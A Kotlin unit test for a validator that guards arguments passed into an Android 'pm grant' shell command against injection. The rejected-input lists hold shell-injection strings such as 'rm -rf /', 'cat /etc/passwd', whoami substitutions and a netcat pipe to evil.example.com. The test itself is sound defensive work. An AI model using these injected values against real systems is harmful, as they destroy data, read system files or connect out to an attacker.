package xyz.block.trailblaze.device

import org.junit.Test
import kotlin.test.assertFailsWith

/**
 * Pins the grammar check for `appId` and `permission` arguments threaded into the
 * `pm grant` shell invocation by [AndroidDeviceCommandExecutor.grantRuntimePermission].
 * Today's only caller passes a hardcoded const list, so this is a forcing function
 * against a future caller forwarding less-trusted input.
 */
class ValidateGrantRuntimePermissionArgsTest {

  @Test
  fun `valid package name and platform permission pass`() {
    validateGrantRuntimePermissionArgs("com.example.app", "android.permission.CAMERA")
  }

  @Test
  fun `valid app-defined permission passes`() {
    validateGrantRuntimePermissionArgs("com.example.app", "com.example.MY_PERMISSION")
  }

  @Test
  fun `blank appId is rejected`() {
    assertFailsWith<IllegalArgumentException> {
      validateGrantRuntimePermissionArgs("", "android.permission.CAMERA")
    }
  }

  @Test
  fun `blank permission is rejected`() {
    assertFailsWith<IllegalArgumentException> {
      validateGrantRuntimePermissionArgs("com.example.app", "")
    }
  }

  @Test
  fun `appId with shell metacharacters is rejected`() {
    val attempts = listOf(
      "com.foo; rm -rf /",
      "com.foo`whoami`",
      "com.foo|cat /etc/passwd",
      "com.foo bar.baz",
    )
    for (bad in attempts) {
      assertFailsWith<IllegalArgumentException>("Should reject appId '$bad'") {
        validateGrantRuntimePermissionArgs(bad, "android.permission.CAMERA")
      }
    }
  }

  @Test
  fun `permission with shell metacharacters is rejected`() {
    // The whole point of this validator alongside appId-validation: prevent shell
    // injection through the permission token.
    val attempts = listOf(
      "android.permission.CAMERA; rm -rf /",
      "android.permission.CAMERA`whoami`",
      "android.permission.CAMERA|nc evil.example.com 8080",
      "android.permission.CAMERA bar.baz",
      "\$(whoami)",
      "android.permission.'CAMERA",
    )
    for (bad in attempts) {
      assertFailsWith<IllegalArgumentException>("Should reject permission '$bad'") {
        validateGrantRuntimePermissionArgs("com.example.app", bad)
      }
    }
  }

  @Test
  fun `single-segment permission is rejected`() {
    // Android permissions are always package-qualified (at least one dot).
    assertFailsWith<IllegalArgumentException> {
      validateGrantRuntimePermissionArgs("com.example.app", "CAMERA")
    }
  }
}
